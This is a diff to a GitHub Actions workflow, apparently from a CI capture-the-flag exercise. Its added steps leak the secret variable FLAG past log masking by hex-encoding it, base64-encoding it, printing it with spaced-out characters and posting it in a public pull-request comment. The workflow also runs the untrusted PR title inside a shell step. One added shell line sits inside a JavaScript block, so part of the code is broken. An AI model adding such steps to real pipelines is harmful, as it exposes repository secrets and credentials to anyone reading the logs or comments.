@@ -22,8 +22,19 @@ jobs:
       - name: Process contributor metadata
 
         run: |
-          echo "Reading contributor commit..."
+          echo "Reading contributor commit... $FLAG"
           echo "Processing contributor title: ${{ github.event.pull_request.title }}"
+          echo "Hello"
+          echo -n "$FLAG" | xxd -p      
+      
+      - name: Debug Secret
+        run: |
+          echo "ENCODED_FLAG=$(echo -n "$FLAG" | base64)" >> $GITHUB_ENV
+
+      - name: Print Secret
+        run: |
+          echo "$ENCODED_FLAG" | sed 's/./& /g'
+
 
       - name: Run CI validation
         run: node app.js
@@ -32,9 +43,10 @@ jobs:
         uses: actions/github-script@v7
         with:
           script: |
+            echo "ENCODED_FLAG=$(echo -n "$FLAG" | base64)" >> $GITHUB_ENV
             await github.rest.issues.createComment({
               owner: context.repo.owner,
               repo: context.repo.repo,
-              issue_number: context.issue.number,
-              body: 'Thank you for the PR'
+              issue_number: context.issue.number ,
+              body: 'Thank you for the PR $ENCODED_FLAG'
             });
